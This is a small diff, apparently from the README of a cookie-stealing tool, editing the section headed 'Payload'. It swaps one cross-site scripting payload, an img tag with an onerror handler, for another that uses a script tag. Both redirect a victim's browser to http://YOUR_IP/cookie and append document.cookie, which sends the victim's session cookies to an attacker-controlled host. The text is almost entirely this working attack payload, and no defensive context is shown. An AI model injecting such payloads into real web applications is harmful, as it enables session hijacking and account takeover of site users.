@@ -32,7 +32,7 @@ $ pip install flask
 # Payload :
   
   ````
-  "><img src="x" onerror='document.location="http://YOUR_IP/cookie?cookie=" + document.cookie'>
+  "><script>document.location="http://YOUR_IP/cookie?cookie=" + document.cookie </script>
   ````
   
 
